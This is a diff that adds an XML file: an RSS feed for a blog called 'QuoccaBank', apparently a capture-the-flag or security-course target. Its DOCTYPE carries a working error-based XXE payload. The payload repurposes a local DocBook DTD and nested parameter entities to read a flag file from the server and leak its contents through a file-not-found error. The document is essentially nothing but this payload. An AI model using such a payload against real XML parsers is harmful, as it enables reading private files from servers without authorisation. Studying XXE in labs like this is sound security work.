@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/sgml/docbook/dtd/4.5/docbookx.dtd">
+<!ENTITY % custom_entity '
+  <!ENTITY &#x25; file SYSTEM "file:///flag_502d2f26a8f23e2df4e7eb8f3d085de3">
+  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+  &#x25;eval;
+  &#x25;error;
+  '>
+  %custom_entity;
+]>
+
+<rss>
+	<channel>
+		<description>The blogging home of QuoccaBank</description>
+		<item>
+			<title>&custom_entity;</title>
+			<link>https://blog.quoccabank.com/?p=42</link>
+			<description><![CDATA[Scott&#8217;s favourite animal are the sharks.]]></description>
+		</item>
+	</channel>
+</rss>
